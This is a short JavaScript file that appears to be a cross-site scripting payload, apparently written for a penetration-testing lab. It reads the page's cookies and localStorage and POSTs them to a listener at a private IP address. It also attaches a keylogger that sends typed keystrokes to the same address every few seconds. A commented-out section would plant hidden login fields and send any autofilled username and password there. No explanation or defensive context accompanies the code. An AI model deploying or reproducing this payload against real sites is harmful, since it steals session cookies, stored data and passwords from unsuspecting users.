var out = {
    cookie: document.cookie || "empty",
    localStorage: localStorage || "empty"
};
fetch("http://192.168.49.52:9000/exfil", {
    method: "POST",
    body: JSON.stringify(out)
});
var start_logger = function () {
    var buffer = "";
    var timer = 0;
    var logKey = function (event) {
        buffer += event.key;
        clearTimeout(timer);
        timer = setTimeout(function () {
            fetch("http://192.168.49.52:9000/exfil", {
                method: "POST",
                body: buffer
            });
            buffer = "";
        }, 3000);
    };
    return logKey;
};
document.addEventListener("keydown", start_logger());
// let body = document.getElementsByTagName("body")[0];
// // var u = document.createElement("input");
// // u.type = "text";
// // u.style.position = "fixed";
// // u.style.opacity = "0";
// var u = document.createElement("input");
// u.type = "text";
// var p = document.createElement("input");
// p.type = "password";
// var d = document.createElement("div");
// d.appendChild(p);
// d.appendChild(u);
// // p.style.opacity = "0";
// // body.append(u);
// body.innerHTML = d.outerHTML;
// var p1 = document.getElementsByTagName("input")[0];
// p1.focus();
// var p2 = document.getElementsByTagName("input")[1];
// setTimeout(function () {
//   fetch("http://192.168.49.52:9000/exfil", {
//     method: "POST",
//     body: JSON.stringify({ p1: p1.value, p2: p2.value }),
//   });
// }, 20000);
